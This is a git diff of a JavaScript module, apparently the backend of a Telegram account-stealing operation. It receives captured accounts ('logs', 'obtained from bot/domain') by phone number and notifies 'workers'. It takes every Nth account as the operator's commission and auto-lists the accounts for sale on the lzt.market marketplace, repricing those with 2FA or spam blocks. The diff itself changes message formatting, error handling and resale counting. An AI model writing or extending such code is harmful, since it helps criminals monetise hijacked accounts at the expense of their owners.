@@ -21,15 +21,15 @@ export default async log => {
         country = 'br';
     }
 
-    let msg = `*⚡️ Аккаунт *${log.phone}
-${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new TelegramBot(log.bot, { polling: false }).getMe().catch(() => { }) || {}).username.replaceAll('_', '\\_')}` : `ℹ️ Добытый с домена ${log.bot}`}`
-
+    let msg = `<b>⚡️ Аккаунт </b>${log.phone}
+${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new TelegramBot(log.bot, { polling: false }).getMe().catch(() => { }) || {}).username}` : `ℹ️ Добытый с домена ${log.bot}`}`
+    
     worker.com = worker.com || com;
     if (logsCount + 1 === worker.com || (worker.com && (logsCount + 1) % worker.com === 0)) {
         log.bot = 'com';
 
-        if (worker.notify) await bot.sendMessage(worker.id, `${msg}\n\n*🤝🏻 Был отдан в качестве комиссии*`, {
-            parse_mode: 'Markdown'
+        if (worker.notify) await bot.sendMessage(worker.id, `${msg}\n\n<b>🤝🏻 Был отдан в качестве комиссии</b>`, {
+            parse_mode: 'HTML'
         })
         const owner = await user.findOne({ id: config.admin });
         worker.lzt = owner.admToken;
@@ -44,7 +44,6 @@ ${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new Teleg
         ...log,
         created: Date.now()
     }).save();
-    console.log(1);
 
     if (worker.lztOn && marketSettings) {
         async function send() {
@@ -79,33 +78,50 @@ ${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new Teleg
                     }
                 }
             })
-                .catch(error => error.response)
+            .catch(error => {
+                console.log('LZT Error:', error.message);
+                
+                if (error.response) {
+                    return error.response;
+                } else if (error.request) {
+                    console.log('No response received:', error.request);
+                    return { status: 500, data: { error: ['Нет ответа от сервера LZT'] } };
+                } else {
+                    return { status: 500, data: { error: [error.message] } };
+                }
+            });
 
+            if (!response) {
+                console.log('Получен пустой ответ от LZT API');
+                return;
+            }
 
-            const error = (response.data?.errors || response.data?.error)?.[0] || (((response?.status || 200) === 200 || response?.status === 502) ? null : 'Технические работы LZT маркета');
+            const error = (response?.data?.errors || response?.data?.error)?.[0] || (((response?.status || 200) === 200 || response?.status === 502) ? null : 'Технические работы LZT маркета');
             if (!error) {
                 const account = response?.data?.item;
                 const item_id = account?.item_id;
-
-
-                msg += `\n\n*✅ Успешно выложен на лолз LZT(https://lzt.market/${item_id})*`;
-
+                let isResale = false
+                if(account?.itemOriginPhrase?.includes("Перепродажа")) {
+                    isResale = true
+                }
+                msg += `\n\n<b>✅ Успешно выложен на лолз <a href="https://lzt.market/${item_id}">LZT</a></b>`;
+                console.log(account)
                 if (account?.telegram_spam_block === -3 || account?.telegram_password) {
                     const price = account.telegram_password === -3 ? marketSettings.pass : marketSettings.spam;
-                    await lolz.editPrice(worker.lzt, item_id, price);
-                }
 
+                    const res = await lolz.editPrice(worker.lzt, item_id, price);
+                    console.log(res)
+                }
                 await market.findOneAndUpdate(
                     { id: marketSettings.id },
                     {
-                        $inc: { success: 1 },
+                        $inc: { success: 1, resale: isResale ? 1 : 0 },
                         $set: { item_id }
                     }
                 );
 
             } else {
                 if (error === 'captcha') {
-                    console.log('капча');
                     return await send();
                 }
                 // if (error === 'Too Many Requests') {
@@ -115,7 +131,7 @@ ${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new Teleg
                 // }
 
                 await market.findOneAndUpdate({ id: marketSettings.id }, { $inc: { error: 1 } })
-                msg += `\n\n*❗️ Не удалось выложить на лолз*\nОшибка: ${error} (Ошибка на стороне LZT)`;
+                msg += `\n\n<b>❗️ Не удалось выложить на лолз</b>\nОшибка: ${error} (Ошибка на стороне LZT)`;
             }
         }
 
@@ -123,6 +139,6 @@ ${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new Teleg
     }
 
     if (worker.notify) await bot.sendMessage(worker.id, msg, {
-        parse_mode: 'Markdown'
+        parse_mode: 'HTML'
     }).catch(console.log);
 }
